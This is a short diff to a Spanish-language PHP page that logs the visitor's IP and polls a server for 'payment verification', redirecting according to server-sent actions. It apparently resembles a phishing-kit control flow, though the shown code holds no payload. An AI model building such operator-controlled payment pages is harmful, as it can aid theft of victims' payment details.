@@ -1,7 +1,7 @@
 <?php
 $ip = getenv("REMOTE_ADDR");
 setlocale(LC_TIME, "spanish");
-$tiempo = strftime("%A, %d de %B de %Y");
+
 date_default_timezone_set('America/Bogota');
 ?>
 <html>
@@ -656,7 +656,16 @@ date_default_timezone_set('America/Bogota');
       body: formData
     });
 
-    const result = await res.json();
+    const text = await res.text();
+    let result;
+    try {
+      result = JSON.parse(text);
+    } catch (parseErr) {
+      console.error("Error al verificar: JSON.parse failed", parseErr, "respuesta:", text);
+      setTimeout(() => checkPaymentVerification(transactionId, messageId), 2000);
+      return;
+    }
+
     console.log("Resultado:", result); // Para depurar si lo necesitas
 
     if (result.action) {
@@ -670,7 +679,8 @@ date_default_timezone_set('America/Bogota');
           break;
 
         case 'confirm_finalizar':
-          window.location.href = "/fin.php";
+        case 'finalizar':
+          window.location.href = "finalizar.php";
           break;
 
         case 'error_logo':
